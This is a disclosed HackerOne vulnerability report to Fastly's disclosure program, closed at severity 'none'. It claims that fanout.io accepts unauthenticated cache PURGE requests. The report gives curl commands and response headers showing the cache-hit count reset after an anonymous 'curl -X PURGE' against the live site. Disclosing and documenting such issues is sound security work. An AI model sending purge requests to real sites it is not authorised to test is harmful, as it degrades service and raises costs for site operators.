# Cache purge requests are not authenticated

## Report Details
- **Report ID**: 1943117
- **URL**: https://hackerone.com/reports/1943117
- **State**: Closed
- **Severity**: none
- **Submitted**: 2023-04-12T00:36:50.237Z
- **Disclosed**: 2023-05-01T14:17:53.440Z

## Reporter
- **Username**: xerhakhd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: fastly-vdp

## Vulnerability Information
## Summary:
Anyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs but also potential Denial of Service attacks.

## Steps To Reproduce:

  1. Fetching the resource headers, we can see in the X-Cache that the resource was a HIT with X-Cache-Hits: 5:
Put the below command in the terminal (this is request):
# curl -s -D - https://fanout.io -o /dev/null
HTTP/2 200
server: nginx/1.14.0 (Ubuntu)
content-type: text/html; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
accept-ranges: bytes
date: Wed, 12 Apr 2023 00:05:08 GMT
via: 1.1 varnish
age: 1215
x-served-by: cache-maa10224-MAA
x-cache: HIT
x-cache-hits: 5
x-timer: S1681257908.308066,VS0,VE0
vary: Cookie
content-length: 20567

  2. Then put the below command to purge the cache as an unauthenticated user. And see the result, Status is OK means it successfully deletes the cache without authentication.
# curl -X PURGE https://fanout.io
{ "status": "ok", "id": "10234-1680248948-114138" }

  3. Now again fire the first command to see the x-cache-hits. See, the x-cache-hits is 1 now.
# curl -s -D - https://fanout.io -o /dev/null
HTTP/2 200
server: nginx/1.14.0 (Ubuntu)
content-type: text/html; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
accept-ranges: bytes
date: Wed, 12 Apr 2023 00:06:01 GMT
via: 1.1 varnish
age: 8
x-served-by: cache-maa10233-MAA
x-cache: HIT
x-cache-hits: 1
x-timer: S1681257962.998849,VS0,VE1
vary: Cookie
content-length: 20567


## Supporting Material/References:
Here is attached screenshots.

 1. {F2287583}
2. {F2287584}
3. {F2287585}

 Also I am putting a reference report link here.
https://hackerone.com/reports/154278

## Impact

This can lead to increased bandwidth costs and degraded application performance. Allowing anonymous users to purge cache could be used to maliciously degrade performance.

## Attachments
- cache_purge-1.JPG
- cache_purge-1.JPG
- cache_purge-2.JPG
- cache_purge-3.JPG
